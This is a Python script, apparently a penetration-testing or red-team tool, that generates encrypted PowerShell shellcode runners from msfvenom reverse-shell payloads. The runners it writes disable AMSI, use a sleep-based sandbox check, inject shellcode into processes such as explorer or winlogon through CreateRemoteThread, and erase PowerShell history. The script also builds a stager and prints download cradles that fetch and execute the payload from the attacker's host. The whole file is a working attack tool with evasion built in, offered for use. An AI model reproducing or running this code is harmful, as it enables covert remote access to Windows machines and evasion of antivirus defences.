#!/usr/bin/python3
import subprocess
import os
import argparse
import sys
import random
import string
import textwrap

separatekey = False #initialize var for optional functionality
stager = False #initialize var for cmd.exe stager functionality

def pwshrun(cmd):
	completed = subprocess.run(["pwsh", "-command", cmd], capture_output=True)
	return completed

def msfvenomrun(cmd):
	completed = subprocess.run(["msfvenom " + cmd], shell = True, capture_output=True)
	return completed

def msfvenomoutput(status, stderr):
	msferrors = str(stderr).replace('b"','').replace('"','').replace("b'","").replace("'","").split("\\n")
	print(status)
	for line in msferrors:
		print("	" + line)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help = True, description = ".PS1 shellcode runner generator", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''\
	Uses msfvenom to generate shellcode.
	Shellcode is AES-256 encrypted with a randomly generated key that is included in the runner.
	Directly injects into an existing user specified process.
	You must specify an injection target of the same or lower integrity than the context in which you have RCE.
	Key/keyhost options modify Runner to contain second download cradle to retrieve AES-256 key separately to decrypt shellcode.
	
	Successfully injected processes:
		Medium: explorer, svchost
		High: sqlservr, spoolsv, dwm, svchost, winlogon	WARNING: svchost in high integrity may crash the target but has been shown to work. Also note Spoolsv may not have the same permissions as other system processes.
	'''))

	#Req arguments
	parser.add_argument('lhost', action='store', help='Lhost for msfvenom payload')
	parser.add_argument('lport', action='store', help='Lport for msfvenom payload')
	parser.add_argument('process', action='store', help='Process to inject payload into.  Must be same integrity or lower, no check for this exists!')
	parser.add_argument('integrity', action='store', help='Integrity of target injection process( M for medium, H for high). Changes process PID selection behaviour.')
	parser.add_argument('execution_method', action='store', help='Options: \'ps\' OR \'cmd\'. Dictates whether PShistory command deletion is included as well as generation of a stager payload for cmd.exe implementations.')
	
	#Optional arguments
	parser.add_argument('-out', action='store', metavar="file.txt", help='Payload output file (default: payload.txt)')
	parser.add_argument('-stager', action='store', metavar="stager.txt", help='Stager output file. Only use this switch when specify cmd for execution_method. (default: stager.txt)')
	parser.add_argument('-keyhost', action='store', help='Specify webserver ip/address that key will be hosted on and key name (example: 192.168.1.1 or www.mydomain.com)')
	parser.add_argument('-key', action='store', metavar="file.txt", help='Key output file. Use in conjunction with -keyhost.')
	parser.add_argument('-M', action='store_true', help='Use default Meterpreter payload (windows/x64/meterpreter/reverse_tcp)')
	parser.add_argument('-p', action='store', metavar="payload", help='Specify msfvenom payload (default: windows/x64/shell_reverse_tcp)')
	parser.add_argument('-switches', action='store', metavar="options", help='Extra msfvenom switches like encoder, rounds. Enter in quotes and do not use -o or -f! (default: -e x64/xor_dynamic)')
	
	if len(sys.argv)==1: #print help if no arguments given
		parser.print_help()
		sys.exit(0)
	args = parser.parse_args()
	if args.stager:
		if args.execution_method == "cmd":
			stagerfile = args.stager
		else:
			print("Cannot use -stager argument with ps execution method.  Use with cmd.")
			sys.exit(0)
	else:
		stagerfile = "stager.txt"
	if args.out:
		payloadfile =  args.out 
	else:
		payloadfile = "payload.txt"
	if args.execution_method == "ps":
		remhistory = "$file = \"$Env:APPDATA\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt\";Get-Content $file | Measure-Object -Line;$a = (Get-Content $file | Measure-Object);(Get-Content $file) | ? {($a.count)-notcontains $_.ReadCount} | Set-Content $file"
	elif args.execution_method == "cmd":
		remhistory = ""
		stager = True
	else:
		print("Invalid selection.  Choose either 'cmd' for cmd.exe or 'ps' for powershell.exe")
		sys.exit(0)
	if args.integrity == "M":
		pidfinder = "$procid=(get-process " + args.process + " | where-object CPU -GT 0)[0].id"
		integprint = "Medium"
	elif args.integrity == "H":
		pidfinder = "$procid=(get-process " + args.process + ")[0].id"
		integprint = "High"
	else:
		print("Invalid integrity level selected, select either 'M' for medium or 'H' for high")
		sys.exit(0)
	if args.key:
		if args.keyhost:
			separatekey = True
		else: 
			sys.exit("You must also use the -keyhost option when using -key!")
	if args.p: #if alternate payload specified
		payload = "-p " + args.p + " "
	elif args.M: #if meterpreter default payload selected
		payload = "-p windows/x64/meterpreter/reverse_tcp "
	elif not args.p and not args.M: #use default payload
		payload = "-p windows/x64/shell_reverse_tcp "	
	if args.switches: #if additional msfvenom switches specified
		disallowed = ["-o", "-f"] #Do not allow user to output shellcode to file or specify alternate format
		if any(x in args.switches for x in disallowed):
			sys.exit("Do not use -o or -f switch in msfvenom options!")
		extra_args = args.switches
	else:
		extra_args = "-e x64/xor_dynamic EXITFUNC=thread" #default encoder 
	
	msfvenomcommand = payload + "LHOST=" + args.lhost + " LPORT=" + args.lport + " -f ps1 " + extra_args #assemble msfvenom command
	print("Attempt to inject into a " + integprint + " integrity " + args.process + " process")
	print("Using Msfvenom command: msfvenom " + msfvenomcommand)
	print("\nGenerating shellcode...")
	shellcode = msfvenomrun(msfvenomcommand) #run msfvenom, capture output
	if shellcode.returncode != 0: #if msfvenom returns an error print errors then exit
		msfvenomoutput("Msfvenom FAILED: ", shellcode.stderr)
		sys.exit(0)
	else:
		msfvenomoutput("Msfvenom warning messages - review to ensure all options successfully validated:", shellcode.stderr)
	print("Generating AES-256 key...")
	powershellkeygen = "$aesKey = New-Object byte[] 32;$rng = [Security.Cryptography.RNGCryptoServiceProvider]::Create();$rng.GetBytes($aesKey);$aesKey" #pwshgenerate random aes-256 key
	aeskey = ("(" + str(pwshrun(powershellkeygen).stdout).replace("b","").replace("'","").replace("\\n",",") + ")").replace(",)",")") #generate aes-256 key and format
	if separatekey:
			keyfile = args.key
			with open(keyfile, 'w') as f: #write key to file
				f.write(aeskey)
			print("AES-256 key written to: " + keyfile)
			key = "$key = (new-object net.webclient).downloadstring('http://" + args.keyhost + "/" + keyfile + "');$key = $key.split(\",\") -replace '[()]',''"
	else:
		key = "$key = " + aeskey

	print("\nEncrypting shellcode...")
	rawshellcode = str(shellcode.stdout).replace("b'[Byte[]] $buf = ","").replace("\\n","").replace("\\r","").replace("'","") #format shellcode
	powershellencrypt = "$aesKey = " + aeskey + ";$shellcode = \"" + rawshellcode + "\";$Secure = ConvertTo-SecureString -String $shellcode -AsPlainText -Force;$encrypted = ConvertFrom-SecureString -SecureString $Secure -Key $aesKey;$encrypted"
	encryptedshellcode = str(pwshrun(powershellencrypt).stdout).replace("b'","").replace("\\n'","")
	if stager:
		print("\nGenerating stager...")
		stagercontents = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
iex (new-object net.webclient).downloadstring('http://""" + args.lhost + """/""" + payloadfile + """') 
		"""
		with open(stagerfile,"w") as f:
			f.write(stagercontents)
		print("Runner written to " + stagerfile + "!")
	print("\nGenerating runner...")
	
	runner = """function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
 [Parameter(Position = 1)] [Type] $delType = [Void]
 )
 $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
 $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
 $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}

function getStrawberries($a) {
 $obfu =  \"""" + encryptedshellcode + """\"
 $secureObject = ConvertTo-SecureString -String $obfu -Key $a
 $decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
 $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
 $decrypted = $decrypted.split(",")
 return $decrypted
} 

$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
$starttime = Get-Date -Displayhint Time
Start-sleep -s 5
$finishtime = Get-Date -Displayhint Time
if ( $finishtime -le $starttime.addseconds(4.5) ) {
 exit
}
""" + key + """

[Byte[]] $buf = getStrawberries $key
 
""" + pidfinder + """
 
$hprocess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $procid)
 
$addr= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hprocess, [IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 
[Int32]$lpNumberOfBytesWritten = 0
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType())([bool]))).Invoke($hprocess, $addr, $buf, $buf.length, [ref]$lpNumberOfBytesWritten)
 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke($hprocess,[IntPtr]::Zero,0,$addr,[IntPtr]::Zero,0,[IntPtr]::Zero)
""" + remhistory
	with open(payloadfile,"w") as f:
		f.write(runner)
		print("Runner written to " + payloadfile + "!")
	print("\nGeneration Complete!")
	if stager:
		cradle = "powershell iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + stagerfile + "')"
		print("\nPS download cradle for CMD.exe usage: " + cradle)
	else:
		cradle = "iex (new-object net.webclient).downloadstring('http://" + args.lhost + "/" + payloadfile + "')"
		print("\nPS download cradle for Powershell.exe usage: " + cradle)
	print("\nIf you are running from a 32 bit process on a 64 bit machine (i.e. psexec) use %SystemRoot%\sysnative\WindowsPowerShell\\v1.0\powershell.exe!")
